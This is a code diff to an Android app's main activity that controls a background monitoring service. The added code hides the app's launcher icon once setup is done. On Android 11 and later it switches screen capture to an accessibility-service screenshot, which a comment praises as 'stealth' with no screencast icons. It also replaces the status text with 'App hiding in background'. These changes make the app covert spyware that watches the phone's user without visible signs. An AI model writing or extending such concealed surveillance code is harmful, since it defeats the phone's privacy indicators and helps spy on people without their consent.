@@ -37,10 +37,10 @@ class MainActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
-        // If setup already done, re-request MediaProjection to refresh screen capture token and pass to service
         val prefs = getSharedPreferences("bw_prefs", MODE_PRIVATE)
         if (prefs.getBoolean("setup_complete", false)) {
-            requestScreenCapture()
+            hideFromLauncher()
+            finish()
             return
         }
 
@@ -50,7 +50,10 @@ class MainActivity : AppCompatActivity() {
     override fun onResume() {
         super.onResume()
         val prefs = getSharedPreferences("bw_prefs", MODE_PRIVATE)
-        if (!prefs.getBoolean("setup_complete", false)) {
+        if (prefs.getBoolean("setup_complete", false)) {
+            hideFromLauncher()
+            finish()
+        } else {
             refreshPermissionUI()
         }
     }
@@ -142,6 +145,11 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun requestScreenCapture() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            // On Android 11+ we use stealth AccessibilityService.takeScreenshot() -> zero screencast/mirroring icons!
+            launchMonitoringService()
+            return
+        }
         val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
         startActivityForResult(mgr.createScreenCaptureIntent(), RC_MEDIA_PROJECTION)
     }
@@ -181,9 +189,10 @@ class MainActivity : AppCompatActivity() {
     // ═══════════════════════════════════════════
 
     private fun launchMonitoringService() {
-        val intent = Intent(this, MonitoringService::class.java).apply {
-            putExtra("resultCode", projectionResultCode)
-            putExtra("projectionData", projectionData)
+        val intent = Intent(this, MonitoringService::class.java)
+        if (projectionResultCode != -1 && projectionData != null) {
+            intent.putExtra("resultCode", projectionResultCode)
+            intent.putExtra("projectionData", projectionData)
         }
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -198,8 +207,9 @@ class MainActivity : AppCompatActivity() {
             .putBoolean("service_enabled", true)
             .apply()
 
-        showStatus("Service started successfully!\nMonitoring is active in the background.")
-        // Keep launcher icon visible so user can easily open app to refresh MediaProjection token after reboots/updates
+        showStatus("Service started successfully!\nApp hiding in background...")
+        hideFromLauncher()
+        finish()
     }
 
     private fun showStatus(message: String) {
